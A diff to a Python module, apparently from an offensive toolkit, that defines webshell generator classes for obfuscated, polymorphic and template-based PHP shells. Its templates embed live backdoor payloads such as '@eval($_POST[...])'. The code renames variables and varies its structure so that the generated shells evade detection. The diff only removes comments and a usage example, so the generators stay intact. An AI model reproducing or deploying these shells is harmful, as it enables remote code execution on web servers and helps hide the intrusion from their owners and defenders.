@@ -34,7 +34,6 @@ class ExampleObfuscatorConnector(WebshellConnector):
         self.validate_params(language, password, encoder)
 
         if language.lower() == 'php':
-            # Example: Simple variable name obfuscation
             var_names = {
                 'password': self._obfuscate_name('password'),
                 'eval': self._obfuscate_name('eval'),
@@ -54,12 +53,10 @@ class ExampleObfuscatorConnector(WebshellConnector):
 
             return f"<?php {code} ?>"
 
-        # Fallback to basic template for other languages
         return f"<?{language} // Example connector - implement {language} support ?>"
 
     def _obfuscate_name(self, name: str) -> str:
         """Simple name obfuscation (example only)."""
-        # Real implementation would use more sophisticated obfuscation
         import hashlib
         return hashlib.md5(name.encode()).hexdigest()[:8]
 
@@ -98,7 +95,6 @@ class ExamplePolymorphicConnector(WebshellConnector):
         self._generation_count += 1
 
         if language.lower() == 'php':
-            # Alternate between different code structures
             if self._generation_count % 3 == 0:
                 code = f"<?php eval($_POST['{password}']); ?>"
             elif self._generation_count % 3 == 1:
@@ -127,7 +123,6 @@ class ExampleCustomTemplateConnector(WebshellConnector):
             description="Example custom template connector"
         )
 
-        # Define custom templates
         self._templates = {
             'php': {
                 'default': '<?php @eval($_POST["{{PASSWORD}}"]); ?>',
@@ -168,7 +163,6 @@ class ExampleCustomTemplateConnector(WebshellConnector):
         if not template:
             raise ValueError(f"No template found for encoder '{encoder}'")
 
-        # Replace placeholders
         code = template.replace('{{PASSWORD}}', password)
 
         if secret_header and secret_value:
@@ -177,7 +171,7 @@ class ExampleCustomTemplateConnector(WebshellConnector):
 
         if inline:
             code = code.replace('\n', ' ').replace('\t', ' ')
-            code = ' '.join(code.split())  # Collapse spaces
+            code = ' '.join(code.split())
 
         return code
 
@@ -191,22 +185,3 @@ class ExampleCustomTemplateConnector(WebshellConnector):
         if lang in self._templates:
             return list(self._templates[lang].keys())
         return []
-
-
-# To use these examples:
-#
-# 1. Copy this file or create your own in the same directory
-# 2. Implement the generate() method
-# 3. The connector will be auto-discovered
-#
-# Example usage:
-#
-#   from ofx.api.webshell import generate_webshell
-#
-#   # Use example obfuscator
-#   shell = generate_webshell('php', password='x', connector_name='example-obfuscator')
-#
-#   # Use polymorphic generator
-#   shell1 = generate_webshell('php', password='x', connector_name='example-polymorphic')
-#   shell2 = generate_webshell('php', password='x', connector_name='example-polymorphic')
-#   # shell1 != shell2 (different structure, same function)
